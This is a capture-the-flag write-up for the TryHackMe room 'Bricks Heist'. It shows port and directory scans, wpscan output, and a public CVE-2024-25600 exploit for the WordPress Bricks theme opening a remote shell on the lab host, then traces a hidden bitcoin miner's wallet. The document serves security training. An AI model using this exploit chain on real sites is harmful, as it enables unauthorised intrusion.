---
title: "TryHack3M: Bricks Heist"
date: 2025-02-06
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF TryHack3M Bricks Heist
categories: [TryHackMe, Easy]
tags: [linux, web, blockchain, wordpress]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>TryHack3M: Bricks Heist</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/tryhack3mbricksheist">https://tryhackme.com/room/tryhack3mbricksheist</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge TryHack3M: Bricks Heist.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.61.202
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 05:36 EST
  Nmap scan report for bricks.thm (10.10.61.202)
  Host is up (0.040s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  443/tcp  open  https
  3306/tcp open  mysql

  Nmap done: 1 IP address (1 host up) scanned in 32.13 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80,443,3306 10.10.61.202
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 05:37 EST
  Nmap scan report for bricks.thm (10.10.61.202)
  Host is up (0.038s latency).

  PORT     STATE SERVICE  VERSION
  22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 4e:2f:5e:75:fa:b3:4f:e7:ab:5d:68:34:24:6c:39:a4 (RSA)
  |   256 92:2d:3f:ed:cc:5a:59:d1:c2:16:a8:d5:f0:c6:b5:2d (ECDSA)
  |_  256 7b:6c:41:f5:68:4b:55:4f:c4:25:14:43:11:52:27:81 (ED25519)
  80/tcp   open  http     WebSockify Python/3.8.10
  |_http-server-header: WebSockify Python/3.8.10
  |_http-title: Error response
  | fingerprint-strings: 
  |   GetRequest: 
  |     HTTP/1.1 405 Method Not Allowed
  |     Server: WebSockify Python/3.8.10
  |     Date: Tue, 18 Feb 2025 10:37:08 GMT
  |     Connection: close
  |     Content-Type: text/html;charset=utf-8
  |     Content-Length: 472
  |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  |     "http://www.w3.org/TR/html4/strict.dtd">
  |     <html>
  |     <head>
  |     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  |     <title>Error response</title>
  |     </head>
  |     <body>
  |     <h1>Error response</h1>
  |     <p>Error code: 405</p>
  |     <p>Message: Method Not Allowed.</p>
  |     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
  |     </body>
  |     </html>
  |   HTTPOptions: 
  |     HTTP/1.1 501 Unsupported method ('OPTIONS')
  |     Server: WebSockify Python/3.8.10
  |     Date: Tue, 18 Feb 2025 10:37:08 GMT
  |     Connection: close
  |     Content-Type: text/html;charset=utf-8
  |     Content-Length: 500
  |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  |     "http://www.w3.org/TR/html4/strict.dtd">
  |     <html>
  |     <head>
  |     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  |     <title>Error response</title>
  |     </head>
  |     <body>
  |     <h1>Error response</h1>
  |     <p>Error code: 501</p>
  |     <p>Message: Unsupported method ('OPTIONS').</p>
  |     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
  |     </body>
  |_    </html>
  443/tcp  open  ssl/http Apache httpd
  |_http-title: Brick by Brick
  |_http-server-header: Apache
  | tls-alpn: 
  |   h2
  |_  http/1.1
  | http-robots.txt: 1 disallowed entry 
  |_/wp-admin/
  |_ssl-date: TLS randomness does not represent time
  |_http-generator: WordPress 6.5
  | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
  | Not valid before: 2024-04-02T11:59:14
  |_Not valid after:  2025-04-02T11:59:14
  3306/tcp open  mysql    MySQL (unauthorized)
```
From here I proceeded the analysis port by port.

## Port 443 Analysis

The web server only displayed an image of a brick wall:

![Website](/assets/img/tryhackme/tryhack3mbrickheist/thm_tryhack3mbrickheist_1.jpg)

I proceeded with a Gobuster directory enumeration and found a significant number of directories:
```bash
$ gobuster dir -k --url https://bricks.thm/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
	===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     https://bricks.thm/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /rss                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
  /login                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
  /0                    (Status: 301) [Size: 0] [--> https://bricks.thm/0/]
  /feed                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
  /atom                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/atom/]
  /s                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
  /b                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
  /wp-content           (Status: 301) [Size: 238] [--> https://bricks.thm/wp-content/]
  /admin                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
  /rss2                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
  /wp-includes          (Status: 301) [Size: 239] [--> https://bricks.thm/wp-includes/]
  /br                   (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
  /sa                   (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
  /rdf                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/rdf/]
  /page1                (Status: 301) [Size: 0] [--> https://bricks.thm/]
  /sample               (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
  /'                    (Status: 301) [Size: 0] [--> https://bricks.thm/]
  /dashboard            (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
  /%20                  (Status: 301) [Size: 0] [--> https://bricks.thm/]
  /sam                  (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
  /wp-admin             (Status: 301) [Size: 236] [--> https://bricks.thm/wp-admin/]
  /phpmyadmin           (Status: 301) [Size: 238] [--> https://bricks.thm/phpmyadmin/]

```

The directory enumeration was misleading because most of the directories redirected either to a WordPress login page or to other subpages, which also displayed the brick wall again. I then performed a subdomain enumeration, but it didn't yield any new results. The directory enumeration revealed a WordPress installation, so I continued with `wpscan`, which identified an interesting plugin:
```bash
[...]
[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
[...]
[+] WordPress theme in use: bricks
 | Version: 1.9.5 (80% confidence)
[...]
```

After researching the plugin, I discoverd an exploit for the Bricks theme on <a href="https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT">Github</a>. This gave me initial access, and I was able to retrieve the first flag:
```bash
$ python3 exploit.py -u https://bricks.thm/                                     

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm/
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> whoami
	apache

Shell> ls
  650c844110baced87e1606453b9*****.txt
  index.php
  kod
  license.txt
  phpmyadmin
  readme.html
  wp-activate.php
  wp-admin
  wp-blog-header.php
  wp-comments-post.php
  wp-config-sample.php
  wp-config.php
  wp-content
  wp-cron.php
  wp-includes
  wp-links-opml.php
  wp-load.php
  wp-login.php
  wp-mail.php
  wp-settings.php
  wp-signup.php
  wp-trackback.php
  xmlrpc.php
Shell> cat 650c844110baced87e1606453b9*****.txt
	THM{[removed]}
```

While further enumerating the system, I found a promising service: 
```bash
Shell> systemctl list-units --type=service --state=running
[...]
[removed]                                 loaded    active   running TRYHACK3M
[...]
Shell> systemctl status [removed]
ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/[removed]; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2025-02-18 11:35:06 UTC; 48s ago
   Main PID: 19283 ([removed]
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/[removed]
             ├─19283 /lib/NetworkManager/[removed]
             └─19284 /lib/NetworkManager/[removed]
```

I analyzed the service directory, and located a configuration file:
```bash
cd /lib/NetworkManager
ls
  [...]
  [removed].conf
  [...]
```

The file logged the miner activity and also contained the encoded wallet address of the miner:
```bash
head [removed].conf
  ID: [removed miner id]
  2024-04-08 10:46:04,743 [*] confbak: Ready!
  2024-04-08 10:46:04,743 [*] Status: Mining!
  2024-04-08 10:46:08,745 [*] Miner()
  2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
  2024-04-08 10:46:08,745 [*] Status: Mining!
  2024-04-08 10:46:10,747 [*] Miner()
  2024-04-08 10:46:12,748 [*] Miner()
  2024-04-08 10:46:14,751 [*] Miner()
  2024-04-08 10:46:16,753 [*] Miner()
```

After decoding the ID using CyberChef, I found the wallet address:

![Wallet Address Decode](/assets/img/tryhackme/tryhack3mbrickheist/thm_tryhack3mbrickheist_2.jpg)

I split the wallet address and searched for it on blockchain.com:

![wallet on Blockchain.com](/assets/img/tryhackme/tryhack3mbrickheist/thm_tryhack3mbrickheist_3.jpg)

After checking the transaction details, I was able to identify the wallet that sends BTC to the miner's wallet:

![Transaction](/assets/img/tryhackme/tryhack3mbrickheist/thm_tryhack3mbrickheist_4.jpg)

After conducting further research, I discovered that the sender's wallet is mentioned in several articles, which links it to a known APT group:

![News Article](/assets/img/tryhackme/tryhack3mbrickheist/thm_tryhack3mbrickheist_5.jpg)

solved! :)
